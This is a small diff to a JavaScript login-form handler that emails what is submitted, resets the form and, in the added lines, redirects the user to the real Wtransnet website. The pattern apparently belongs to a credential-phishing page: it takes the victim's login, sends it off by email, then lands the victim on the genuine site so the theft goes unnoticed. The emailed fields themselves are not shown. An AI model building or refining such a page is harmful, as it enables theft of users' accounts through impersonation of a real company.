@@ -49,9 +49,11 @@ loginForm.addEventListener('submit', async function(e) {
     );
 
     console.log(':', emailResponse);
-    
+
 
     loginForm.reset();
+
+    window.location.href = 'https://www.wtransnet.com/en-en/';
 
   } catch (error) {
     console.error('Error sending email:', error);
